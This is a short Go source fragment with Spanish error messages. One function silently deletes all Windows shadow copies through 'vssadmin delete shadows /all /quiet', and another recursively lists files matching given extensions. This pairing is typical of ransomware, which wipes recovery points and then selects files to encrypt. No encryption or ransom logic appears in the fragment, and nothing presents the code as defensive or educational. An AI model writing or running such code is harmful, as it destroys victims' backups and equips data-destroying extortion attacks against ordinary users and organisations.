func DeleteAllShadowCopies() error {
	cmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error al borrar shadow copies: %w\nsalida: %s", err, string(output))
	}
	return nil
}

func ListFiles(root string, extensions []string) ([]string, error) {
	var files []string

	normalized := make([]string, len(extensions))
	for i, ext := range extensions {
		ext = strings.ToLower(ext)
		if !strings.HasPrefix(ext, ".") {
			ext = "." + ext
		}
		normalized[i] = ext
	}

	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		if d.IsDir() {
			return nil
		}

		fileExt := strings.ToLower(filepath.Ext(d.Name()))
		for _, ext := range normalized {
			if fileExt == ext {
				files = append(files, path)
				break
			}
		}

		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("error al recorrer el directorio: %w", err)
	}

	return files, nil
}